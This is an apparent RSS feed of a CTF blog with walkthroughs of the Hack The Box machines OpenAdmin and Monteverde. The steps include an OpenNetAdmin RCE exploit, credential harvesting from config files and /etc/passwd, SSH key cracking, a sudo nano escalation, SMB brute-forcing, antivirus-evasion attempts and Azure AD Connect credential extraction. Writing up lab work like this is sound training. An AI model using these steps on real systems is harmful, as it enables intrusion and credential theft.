<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Xyniath</title>
        <link>https://xyniath.github.io/posts/</link>
        <description>Recent content in Posts on Xyniath</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-gb</language>
        <lastBuildDate>Tue, 21 Jan 2020 21:08:55 +0000</lastBuildDate>
        <atom:link href="https://xyniath.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Openadmin</title>
            <link>https://xyniath.github.io/posts/openadmin/</link>
            <pubDate>Tue, 21 Jan 2020 21:08:55 +0000</pubDate>
            
            <guid>https://xyniath.github.io/posts/openadmin/</guid>
            <description>Introduction IP: 10.10.10.171
Difficulty: Easy
Initial nmap Scan Running the initial nmap scan: nmap -sC -sV -oN nmap 10.10.10.171
Gave me the following:
From the nmap scan, you can see that there isn&#39;t too much here.
  The machine is running Ubuntu Linux
  Port 22 - The ssh protocol, can’t really access this without credentials
  Port 80 - HTTP port, usually hosts web pages etc. In this case, it&#39;s the Ubuntu Apache web server</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p><strong>IP</strong>: 10.10.10.171</p>
<p><strong>Difficulty</strong>: Easy</p>
<h2 id="initial-nmap-scan">Initial nmap Scan</h2>
<p>Running the initial <code>nmap</code> scan:
<code>nmap -sC -sV -oN nmap 10.10.10.171</code></p>
<p>Gave me the following:</p>
<p><img src="/posts/openadmin/nmapscan.png" alt="Nmap Scan"></p>
<p>From the <code>nmap</code> scan, you can see that there isn't too much here.</p>
<ul>
<li>
<p>The machine is running <strong>Ubuntu Linux</strong></p>
</li>
<li>
<p><strong>Port 22</strong> - The ssh protocol, can’t really access this without credentials</p>
</li>
<li>
<p><strong>Port 80</strong> - HTTP port, usually hosts web pages etc. In this case, it's the Ubuntu Apache web server</p>
</li>
</ul>
<p>With the port 80 being my only option, I opt to investigate the webpage.</p>
<h2 id="enumerating-port-80">Enumerating Port 80</h2>
<p>When I go to 10.10.10.171:80, it brings me to the <strong>Apache2 Ubuntu Default Page</strong>.</p>
<p><img src="/posts/openadmin/defaultpage.png" alt="Apache Default Page"></p>
<p>As there are no links on the page (or in the webpage source code), leading elsewhere locally, I decided to do a <code>dirbuster</code> scan. With the following settings</p>
<p><img src="/posts/openadmin/dirbuster1.png" alt="Dirbuster Scan Settings"></p>
<p>After a few seconds, directories are already being found.
<img src="/posts/openadmin/dirbuster2.png" alt="Dirbuster results"></p>
<p>I first check the <strong>/music/</strong> directory</p>
<p><img src="/posts/openadmin/musicsite.png" alt="Sol Music"></p>
<p>It brings me to an internal website called SolMusic. Going through the indexing on the website, it mainly takes me to /music/index.html even when the link text specifies another function, than return to a blog page.</p>
<p>I then try the /ona/ directory</p>
<p><img src="/posts/openadmin/ona.png" alt="Open Net Admin"></p>
<p>Already, this immediately grabs my attention. The Yellow notice to the left stating that the current version is <strong>18.1.1</strong>.
Clicking on the <strong>DOWNLOAD</strong> button takes me to OpenNetAdmin, so I can already try find an exploit for the current version. So I do.</p>
<h2 id="exploiting-opennetadmin">Exploiting OpenNetAdmin</h2>
<p>The first link after searching <strong>OpenNetAdmin v18.1.1</strong> links to a remote code execution exploit linked <a href="https://www.exploit-db.com/exploits/47691"><strong>here</strong></a>.</p>
<p><img src="/posts/openadmin/scriptcat.png" alt="Script Contents"></p>
<p>I then renamed it to script.sh, and executed the command:</p>
<p><code>chmod +x script.sh</code> to give execute permissions to the script.</p>
<p>To use the script you run:
<code>./script.sh http://10.10.10.171/ona/</code></p>
<p><img src="/posts/openadmin/scriptexecute.png" alt="Exploitation"></p>
<p>Executing <code>whoami</code> returned www-data as the current user we're logged in as.</p>
<p>This script didn't allow for directory traversal, so using commands like <code>ls dirname/</code> to see the contents of a directory was necessary to see what files were in a directory, then execute <code>cat direname/filname</code>.</p>
<p>Looking through the files, I came across <code>config/auth_ldap.config.php</code>this had a bind pw, but this probably isn't what we're looking for.</p>
<p><img src="/posts/openadmin/ldap.png" alt="LDAP"></p>
<p>After digging a littlebit futher, I see <code>local/config/database_settings.inc.php</code> and this contains an array of information, more importantly the servers db password and login.</p>
<p><img src="/posts/openadmin/dbpass.png" alt="DB Settings File"></p>
<p>In this file, we find:</p>
<p><strong>db_login</strong> = ona_sys</p>
<p><strong>db_passwd</strong> = n1nj4W4rri0R!</p>
<p>This doesn't*look like a default password, so <em>someone</em> will have changed this from a default value.</p>
<p>So, what I do now is enumerate using the shell that I have obtained, and try to find accounts on the system.</p>
<p>So I just typed <code>cat /etc/passwd</code></p>
<p><img src="/posts/openadmin/etcpasswd.png" alt="passwd File"></p>
<p><code>cat /home/</code> would also give user accounts</p>
<p><img src="/posts/openadmin/home.png" alt="Home Directory"></p>
<p>Now we have a list of potenial users and a password</p>
<p><strong>Users</strong> - jimmy, joanna</p>
<p><strong>Password</strong> - n1nj4W4rri0R!</p>
<p>What I decide to do with this information, is try logging in to the machine using ssh, as it is common (and bad practice) for someone to use the <em>same</em> credentials in more than one place.</p>
<p>So, I exit the shell.</p>
<h2 id="logging-in-as-a-user">Logging in as a User</h2>
<p>I attempt to ssh into the machine, starting with <strong>jimmy</strong></p>
<p><code> ssh jimmy@10.10.10.171</code></p>
<p>Sure enough, <strong>jimmy</strong> and <strong>n1nj4W4rri0R!</strong> were the combination to log in to his account!</p>
<p>I also tried the password on the <strong>joanna</strong> account just to make sure, and the credentials did not work.</p>
<p><img src="/posts/openadmin/jimmy.png" alt="Jimmy SSH"></p>
<p>There was no user.txt for jimmy, so it seems like we will be looking to getting access into the <strong>joanna</strong> account.</p>
<h2 id="machine-enumeration">Machine Enumeration</h2>
<p>Now that I was logged into the <strong>jimmy</strong> account, I started to enumerate, and see what I could find.</p>
<p>But before this, I checked to see if I could run any enumeration scripts.</p>
<p>On my machine, I downloaded the linenum.sh script which can be found <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"><strong>here</strong></a>.</p>
<p><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh &gt; linenum.sh</code></p>
<p>Started a python server</p>
<p><code>python -m SimpleHTTPServer 80</code></p>
<p>And then proceeded to download the file using the target machine</p>
<p><code>curl 10.10.14.4/linenum.sh &gt; linenum.sh</code></p>
<p>After it downloaded, it wasn't executable so I used:
<code>chmod +x linenum.sh</code></p>
<p>Then I ran the script <code>./linenum.sh</code> and waited.</p>
<p>Looking through the script, theres a lot that stood out. It shows that <strong>jimmy</strong> is in two groups, <strong>jimmy</strong> &amp; <strong>internal</strong>. <strong>Internal</strong> seemed interesting.</p>
<p>There was also a lot of information about machine connections, internally and externally(which I will come to later on)</p>
<p>I checked to see if there was a folder named internal using:</p>
<p><code>find / -type d -name internal 2&gt;dev/null</code></p>
<p>The <code>2&gt;dev/null</code> removes any <strong>permission denied</strong> warnings, and gives a clearer output.</p>
<p><img src="/posts/openadmin/internalsearch.png" alt="Internal Search"></p>
<p>Immediately, the /var/www/internal grabs my attention. I then navigate to this directory.</p>
<p>In this dir, there are 3 files.</p>
<ul>
<li>index.php</li>
<li>logout.php</li>
<li>main.php</li>
</ul>
<p>I looked into each file, to see if there was anything interesting&hellip; and there was, in main.php
<img src="/posts/openadmin/mainphp.png" alt="Internal Search"></p>
<p>This file is getting joannas ssh id rsa key with
<code>$output = shell_exec('cat /home/joanna/.ssh/id_rsa');</code>
and then outputting it to the screen.</p>
<p>it also says &ldquo;Don't forget your &ldquo;ninja&rdquo; password&rdquo;
I needed a way to execute this.</p>
<p>I presume this is an internal webserver, that can only be accessed from inside the network, and seen as I have access to this machine, that's not an issue.</p>
<p>I just had to find where this page is being displayed. And looking back at the output from the <strong>linenum.sh</strong> script I saw this.</p>
<p><img src="/posts/openadmin/serverconnections.png" alt="Connection List"></p>
<p>From here I saw that there are 3 internal connections, and 2 external.</p>
<p><strong>Internal Servers</strong></p>
<ul>
<li>127.0.0.53:53</li>
<li>127.0.0.1:3306</li>
<li>127.0.0.1:52846</li>
</ul>
<p>I used <code>curl ip:port/main.php </code> on each internal server.</p>
<p><strong>127.0.0.152846/main.php</strong> returned the rsa key!</p>
<p><img src="/posts/openadmin/rsa.png" alt="Internal Search"></p>
<h2 id="cracking-with-rsa-private-key">Cracking With RSA Private Key</h2>
<p>I copied the RSA private key into a new file called id_rsa.</p>
<p>I then used ssh2john to convert this RSA key into a hash, crackable by John.</p>
<p><code>/usr/share/john/ssh2john.py id_rsa &gt; crack.txt</code></p>
<p>This created a file called crack.txt containing the hash.</p>
<p>To crack this file, I use:
<code>john --wordlist=/root/Hacking/Wordlists/rockyou.txt crack.txt</code></p>
<p>Within a few seconds&hellip;
<img src="/posts/openadmin/password.png" alt="Cracked"></p>
<p>I got the password as <strong>bloodninjas</strong>!</p>
<p>I could then exit from the <strong>jimmy</strong> ssh session and attempt to login as joanna:</p>
<p><code>ssh -i id_rsa joanna@10.10.10.171</code></p>
<p>This gave me an error that the key was &lsquo;too open&rsquo; so <code>chmod 400 id_rsa</code> fixed the issue</p>
<p>typed <strong>bloodninjas</strong> as the password and&hellip;
<img src="/posts/openadmin/joanna.png" alt="User"></p>
<p>I was in! And just had to read the user.txt file for user flag.</p>
<h2 id="getting-root">Getting Root</h2>
<p>Whilst trying to get root for this machine, I was introduced to GTFOBins. GTFOBins is a huge list of using legitimate functions of Unix binaries to bypass local security restrictions on a machine.</p>
<p>In this box, I use functions inside of nano to gain a root level shell.</p>
<p><img src="/posts/openadmin/gtfobin.png" alt="GTFOBin"></p>
<p>So I just followed the instructions. And at first I got my shell but it didn't escalate privileges.</p>
<p>I then tried around a bit and found that further down the nano page, there's a sudo escalation.</p>
<p><img src="/posts/openadmin/gtfowin.png" alt="GTFOWin"></p>
<p><code>sudo nano /opt/priv</code> worked and gave me a new shell, where running <code>whoami</code> showed that I was root.</p>
<p><img src="/posts/openadmin/shell.png" alt="Root Shell"></p>
<p>Now all I had to do was navigate to /root/ and get the flag.</p>
<p><img src="/posts/openadmin/rootxt.png" alt="Root"></p>
<p>And that's it!</p>
<h2 id="what-i-learnt-from-this-box">What I Learnt From This Box</h2>
<ul>
<li>GTFOBins</li>
<li>The use of internal webservers</li>
<li>Cracking RSA Private Keys</li>
<li>Some more enumeration skills</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Monteverde</title>
            <link>https://xyniath.github.io/posts/monteverde/</link>
            <pubDate>Tue, 21 Jan 2020 08:23:07 +0000</pubDate>
            
            <guid>https://xyniath.github.io/posts/monteverde/</guid>
            <description>Introduction IP: 10.10.10.172 Difficulty: Easy
This is my write-up for the Hack the Box machine Monteverde.
Initial nmap Scan Running the inital nmap scan:
nmap -sV -sC -p- -oN nmap 10.10.10.172
Yielded the following results:
From here, you can see that there are 18 open ports and that the windows is running on windows.
Ports That Stand Out   Port 389 - shows that there&#39;s an Active Directory domain named MEGABANK present on the system which may become useful later.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p><strong>IP</strong>: 10.10.10.172
<strong>Difficulty</strong>: Easy</p>
<p>This is my write-up for the Hack the Box machine Monteverde.</p>
<h2 id="initial-nmap-scan">Initial nmap Scan</h2>
<p>Running the inital <code>nmap</code> scan:</p>
<p><code>nmap -sV -sC -p- -oN nmap 10.10.10.172</code></p>
<p>Yielded the following results:</p>
<p><img src="/posts/monteverde/nmapscan.png" alt="Nmap Scan"></p>
<p>From here, you can see that there are 18 open ports and that the windows is running on windows.</p>
<h3 id="ports-that-stand-out">Ports That Stand Out</h3>
<ul>
<li>
<p><strong>Port 389</strong> - shows that there's an Active Directory domain named MEGABANK present on the system which may become useful later.</p>
</li>
<li>
<p><strong>Port 445</strong> - Stands out as its used generally for windows SMB protocol, furthering the significance of this results, we also see host script results on this protocol showing us the smb security mode as 2.02.</p>
</li>
<li>
<p><strong>Port 5985</strong> - Showing a http server, hosting a &ldquo;Document not found&rdquo; page. This port used for Windows Server management.</p>
</li>
</ul>
<h2 id="enumeration-of-smb-protocol">Enumeration of SMB Protocol</h2>
<p>I decided to start off by enumerating the smb protocol on the machine, I did this by running another nmap scan with <code>-A</code>.</p>
<p><img src="/posts/monteverde/smbportscan.png" alt="Nmap Scan"></p>
<p>Here, after the scan, it now states that the security mode is actually 3.00 as opposed to the 2.02 as previously discovered.</p>
<p>I then used enum4linux to enumerate the system
<code>enum4linux -U 10.10.10.172</code></p>
<p><img src="/posts/monteverde/enum4linuxdomainsid.png" alt="Domain SID">
<strong>Domain Name</strong> - MEGABANK
And also list of the users present on the system
<img src="/posts/monteverde/enum4linuxusers.png" alt="Users"></p>
<p><strong>Users</strong> - Guest, AAD_987d7f2f57d2, mhope, smorgan, dgalanos, roleary, SABatchJobs, svc-ata, svc-bexec &amp; svc-netapp</p>
<p>AAD_987d7f2f57d2 seemed interesting, and after research into this type of user, shows that there's an Azure Active Directory on the machine.</p>
<h2 id="brute-forcing-the-smb-login">Brute-Forcing the SMB Login</h2>
<p>After finding a list of users on the machine and that the SMB protocol was open, I could potentially launch a brute-force login attempt on the machine.</p>
<p>To do this, I used the Metasploit module (auxiliary/scanner/smb/smb_login) for this, as I tried THC Hydra but it didn't seem to work for me.</p>
<p>At first, I tried using the <em>user-style</em> accounts: mhope, smorgan, dgalanos and roleary to no success.</p>
<p>I then decided to use SABatchJobs next. Using BLANK_PASSWORDS and USER_AS_PASS both set to true.
<img src="/posts/monteverde/batchjobsbforce.png" alt="SABatchJobs Brute-Force"></p>
<p>As soon as I started the exploit, the password was found instantly.
<img src="/posts/monteverde/sabatchcreds.png" alt="SABatchJobs Credentials">
<strong>User</strong>: SABatchJobs</p>
<p><strong>Pass</strong>: SABatchJobs</p>
<h2 id="enumerating-the-smb-shares">Enumerating the SMB Shares</h2>
<p>To enumerate the SMB shares, I used <code>smbclient</code></p>
<p><code>smbclient -L 10.10.10.172 -U SABatchJobs</code></p>
<p><img src="/posts/monteverde/smbshares.png" alt="SMB shares"></p>
<p>A particular share that interests me is named <strong>azure_uploads</strong>. So I ran:</p>
<p><code>smbclient //10.10.10.172/azure_uploads</code></p>
<p><img src="/posts/monteverde/smbazureuploads.png" alt="SMB azure_uploads">
But didn't come across anything in the folder</p>
<p>Most of the directories seemed empty (or I didn't have permission to view them) or didn't have any useful files in apart from the <strong>$users</strong> share.</p>
<p><img src="/posts/monteverde/smbusers.png" alt="SMB users$"></p>
<p>All the directories in the <strong>users$</strong> share were empty apart from <strong>mhope</strong> which contained one file named <strong>azure.xml</strong>.</p>
<p>In order to view this file, I used <code>get azure.xml</code> which downloaded the file to the directory in which I used the <code>smbclient</code> command.</p>
<p>The <strong>azure.xml</strong> looked like this:</p>
<p><img src="/posts/monteverde/azurexml.png" alt="azure.xml"></p>
<p>As you can see, there's a password here: <strong>4n0therD4y@n0th3r$</strong>.</p>
<p>I assumed this was the password for the user <strong>mhope</strong>.</p>
<p><strong>User</strong> - mhope</p>
<p><strong>Pass</strong> - 4n0therD4y@n0th3r$</p>
<h2 id="accessing-the-machine--getting-user-flag">Accessing the Machine &amp; Getting User Flag</h2>
<p>To access the machine, I used <strong>Wvil-WinRM</strong>.</p>
<p>I chose this because the server is using <strong>Windows Server Management</strong> on <strong>port 5985</strong>.</p>
<p>You can install <strong>Evil-WinRM</strong> using <code>gem install evil-winrm</code>.</p>
<p>To gain access to the machine:
<code>evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$</code></p>
<p><img src="/posts/monteverde/evilwinrm.png" alt="Evil-WinRM"></p>
<p>I then had a shell on the machine! (Specifically PowerShell).</p>
<p>Navigating to the Desktop folder, on the user showed the user.txt flag. On a Windows machine using <code>type user.txt</code> will print the flag to the screen.</p>
<h2 id="getting-root">Getting Root</h2>
<p>This part of the box proved to be the most difficult.</p>
<p>Getting root took me a very long time, with a lot of potential exploits being detected by an antivirus present on the system.</p>
<p>Without doing any <em>real</em> enumeration, I tried to get a shell from using a msfvenom payload by hosting it on a server, download it from the machine, and then run it. However an error in relation to Anti-Virus detection occurred.
<img src="/posts/monteverde/averror.png" alt="Anti-Virus Error"></p>
<p>I then tried again, by encoding the payload once, then twice, and unfortunately still didn't work.</p>
<p>Mimikatz - commonly ussed to steal credentials and escalate privileges (<em>unsurprisingly</em>) was also detected by the AV.</p>
<p>The Anti-Virus restricted a lot I could do, so my next steps were to see if there were any ways I could bypass it via disabling it, etc. But I couldn't find much.</p>
<p>At this point, I started to enumerate. <strong>WinEnum</strong> didn't produce any output on the terminal and was just stuck, so I looked around the system to see what I could find. Checking directories that may seem interesting. In an AppData directory I came across a file credentials file but didn't have much information.</p>
<p>Aftr not finding anything for a while, I took a break and came back and forgot the server was running an <strong>Azure Active Directory</strong> (With the user <strong>AAD_987d7f2f57d2</strong>) And through exploitation of this I could potentially get privesc.</p>
<p>Looking into AAD exploits, I came across this <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/"><strong>blog post</strong></a> by Adam Chester (XPN).</p>
<p>This provided some valuable information and a PowerShell script (.ps1) file, which needed to be edited to exploit this machine linked <a href="https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/28723eb269eafff5168b31ba1ea4722171d50af7/azuread_decrypt_msol.ps1"><strong>here.</strong></a></p>
<p>Discovering what to do in terms of changing values in this file, took a long while.</p>
<p>Until (After <em><strong>MANY</strong></em> iterations, eliciation and enumerations) I found several fixes:</p>
<ul>
<li>Changing the 3rd line in the script to this:
<code>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=.;Initial Catalog=ADSync;trusted_connection=true;&quot;</code></li>
<li>Removing the 1st line of code</li>
<li>Re-entering the apostrophe at the end of the line starting with <code>add-type -path</code> (as it wasn't a valid apostrophe and caused syntax errors)</li>
</ul>
<p>I then set up a HTTP Server on my machine with <code>python -m SimpleHTTPServer 80</code>.</p>
<p>And then proceeded to download this file to the Monteverde Machine using PowerShell
<code>Invoke-WebRequest -Uri hostserverip/azuread_decrypt_msol.ps1 -OutFile script.ps1</code>.</p>
<p><img src="/posts/monteverde/scriptdownload.png" alt="Downloading Script"></p>
<p>Then I ran the script with <code>.\script.ps1</code>.</p>
<p><img src="/posts/monteverde/admincreds.png" alt="Administrator Credentials"></p>
<p>And we got the Administrator password!</p>
<p><strong>User</strong> - administrator
<strong>Pass</strong> - d0m@in4dminyeah!</p>
<p>After getting these credentials, I then ended my <strong>Evil-WinRM</strong> session on <strong>mhope</strong> and restarted using the admin user and password.</p>
<p><img src="/posts/monteverde/root.png" alt="Root"></p>
<p>And that's <strong>root!</strong></p>
<h2 id="what-i-learnt-from-this-box">What I Learnt From This Box</h2>
<ul>
<li>SMB enumeration</li>
<li>SMB brute-forcing</li>
<li>Azure Active Directory knowledge</li>
<li>Persistence</li>
<li>Win-RM</li>
<li>Working with PowerShell scripts</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Welcome</title>
            <link>https://xyniath.github.io/posts/welcome/</link>
            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
            
            <guid>https://xyniath.github.io/posts/welcome/</guid>
            <description>Welcome to my blog!
This is where I&#39;ll be posting my CTF write-ups, hobby material &amp;amp; other things.
Feel free to contact me on twitter @xyniath</description>
            <content type="html"><![CDATA[<p>Welcome to my blog!</p>
<p>This is where I'll be posting my CTF write-ups, hobby material &amp; other things.</p>
<p>Feel free to contact me on twitter @xyniath</p>
]]></content>
        </item>
        
    </channel>
</rss>
